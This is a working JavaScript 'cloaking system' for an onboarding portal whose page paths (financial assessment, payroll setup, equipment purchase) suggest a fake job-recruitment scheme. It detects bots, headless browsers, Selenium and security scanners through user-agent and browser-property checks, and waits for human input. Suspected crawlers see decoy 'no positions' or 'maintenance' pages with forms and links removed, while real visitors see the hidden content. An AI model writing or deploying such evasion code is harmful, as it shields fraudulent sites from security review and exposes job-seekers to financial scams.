// ULTIMATE CLOAKING SYSTEM FOR ONBOARDING PORTAL
(function() {
    'use strict';

    const CloakSystem = {
        // Enhanced bot detection
        detectBot: function() {
            const botIndicators = [
                // User Agent patterns
                /bot|crawl|spider|headless|phantom|selenium|automation|scanner|check|proxy|monitor/i.test(navigator.userAgent),
                
                // Browser properties
                navigator.webdriver,
                window.cdc_adoQpoasnfa76pfcZLmcfl_,
                window._Selenium_IDE_Recorder,
                
                // Plugin and language checks
                navigator.plugins.length === 0,
                navigator.languages.length === 0,
                
                // Screen size checks (headless browsers often have 0x0)
                window.outerHeight === 0,
                window.outerWidth === 0,
                
                // Performance API anomalies
                performance.memory && performance.memory.totalJSHeapSize < 10000000
            ];
            
            return botIndicators.some(indicator => indicator === true);
        },

        // Human verification with multiple methods
        verifyHuman: function() {
            return new Promise((resolve) => {
                let humanDetected = false;
                const verificationEvents = ['mousemove', 'click', 'scroll', 'keydown', 'touchstart'];
                
                const humanHandler = () => {
                    if (!humanDetected) {
                        humanDetected = true;
                        verificationEvents.forEach(event => {
                            document.removeEventListener(event, humanHandler);
                        });
                        resolve(true);
                    }
                };

                // Add event listeners for human interaction
                verificationEvents.forEach(event => {
                    document.addEventListener(event, humanHandler, { once: true });
                });

                // Fallback: If no interaction but page is visible and focused
                setTimeout(() => {
                    if (!humanDetected) {
                        if (document.visibilityState === 'visible' && document.hasFocus()) {
                            resolve(true);
                        } else {
                            resolve(false);
                        }
                    }
                }, 6000);
            });
        },

        // Show decoy content based on page type
        showDecoyContent: function() {
            const pageType = this.getPageType();
            const decoyContent = {
                'login': `
                    <div class="container mt-5">
                        <div class="row justify-content-center">
                            <div class="col-md-6">
                                <div class="card shadow-sm">
                                    <div class="card-body text-center p-5">
                                        <h3 class="text-muted mb-3">Career Portal</h3>
                                        <div class="alert alert-info">
                                            <i class="fas fa-info-circle me-2"></i>
                                            No active career opportunities at this time.
                                        </div>
                                        <p class="text-muted small">
                                            Please check back later for new positions.
                                        </p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                `,
                'dashboard': `
                    <div class="container mt-4">
                        <div class="alert alert-warning">
                            <h4><i class="fas fa-exclamation-triangle me-2"></i>System Maintenance</h4>
                            <p class="mb-0">The onboarding system is currently undergoing scheduled maintenance. Please try again later.</p>
                        </div>
                    </div>
                `,
                'financial': `
                    <div class="container mt-4">
                        <div class="alert alert-info">
                            <h4>Financial Services</h4>
                            <p>Financial assessment services are temporarily unavailable. Please contact HR for assistance.</p>
                        </div>
                    </div>
                `,
                'payroll': `
                    <div class="container mt-4">
                        <div class="alert alert-warning">
                            <h4>Payroll System Update</h4>
                            <p>Payroll services are currently being updated. Please check back in 24 hours.</p>
                        </div>
                    </div>
                `,
                'default': `
                    <div class="container mt-4">
                        <div class="alert alert-secondary">
                            <h4>Page Not Available</h4>
                            <p>The requested page is not currently available.</p>
                        </div>
                    </div>
                `
            };

            document.body.innerHTML = decoyContent[pageType] || decoyContent.default;
            
            // Remove all interactive elements
            document.querySelectorAll('form, button, a[href]').forEach(element => {
                element.remove();
            });
            
            // Prevent any form submissions
            document.addEventListener('submit', (e) => {
                e.preventDefault();
                return false;
            });
        },

        // Get current page type
        getPageType: function() {
            const path = window.location.pathname.toLowerCase();
            if (path.includes('login')) return 'login';
            if (path.includes('candidate-dashboard')) return 'dashboard';
            if (path.includes('financial-assessment')) return 'financial';
            if (path.includes('payroll-setup')) return 'payroll';
            if (path.includes('program-commitment')) return 'commitment';
            if (path.includes('equipment-purchase')) return 'equipment';
            if (path.includes('admin-dashboard')) return 'admin';
            return 'default';
        },

        // Initialize cloaking system
        init: async function() {
            // Immediate bot check
            if (this.detectBot()) {
                this.showDecoyContent();
                return;
            }

            // Human verification
            const isHuman = await this.verifyHuman();
            
            if (!isHuman) {
                this.showDecoyContent();
            }
            // If human, do nothing - page loads normally
        }
    };

    // Start cloaking system
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => CloakSystem.init());
    } else {
        CloakSystem.init();
    }

})();
